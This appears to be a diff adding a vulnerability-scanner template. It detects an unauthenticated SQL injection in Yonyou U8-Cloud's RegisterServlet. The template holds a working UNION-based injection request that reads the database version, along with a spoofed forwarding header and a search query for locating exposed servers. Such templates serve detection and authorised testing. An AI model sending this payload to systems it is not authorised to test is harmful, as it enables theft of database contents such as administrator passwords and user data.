@@ -1,0 +1,37 @@
+http:
+- matchers:
+  - dsl:
+    - status_code==200 && contains_all(body,"Error:invalid","SQL Server")
+    type: dsl
+  raw:
+  - 'GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Forwarded-For: 127.0.0.1
+
+    Cookie: JSESSIONID=D523370AE42E1D2363160250C914E62A.server
+
+    '
+id: yongyou-u8-nc-bs-sm-login2-RegisterServlet-sql-Injection
+info:
+  author: "\u738B\u963F\u59E8\u4ECB\u7ECD\u7684"
+  description: "\u7528\u53CBU8-Cloud-RegisterServlet\u63A5\u53E3\u5904\u5B58\u5728\
+    SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u672A\u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u653B\
+    \u51FB\u8005\u9664\u4E86\u53EF\u4EE5\u5229\u7528 SQL \u6CE8\u5165\u6F0F\u6D1E\u83B7\
+    \u53D6\u6570\u636E\u5E93\u4E2D\u7684\u4FE1\u606F\uFF08\u4F8B\u5982\uFF0C\u7BA1\
+    \u7406\u5458\u540E\u53F0\u5BC6\u7801\u3001\u7AD9\u70B9\u7684\u7528\u6237\u4E2A\
+    \u4EBA\u4FE1\u606F\uFF09\u4E4B\u5916\uFF0C\u751A\u81F3\u5728\u9AD8\u6743\u9650\
+    \u7684\u60C5\u51B5\u53EF\u5411\u670D\u52A1\u5668\u4E2D\u5199\u5165\u6728\u9A6C\
+    \uFF0C\u8FDB\u4E00\u6B65\u83B7\u53D6\u670D\u52A1\u5668\u7CFB\u7EDF\u6743\u9650\
+    \u3002"
+  metadata:
+    fofa-query: "FOFA:app=\"\u7528\u53CB-U8-Cloud\""
+    max-request: 1
+    verified: true
+  name: "\u7528\u53CBU8-Cloud-RegisterServlet\u63A5\u53E3\u5904\u5B58\u5728SQL\u6CE8\
+    \u5165\u6F0F\u6D1E"
+  reference: null
+  severity: critical
+  tags: sqli
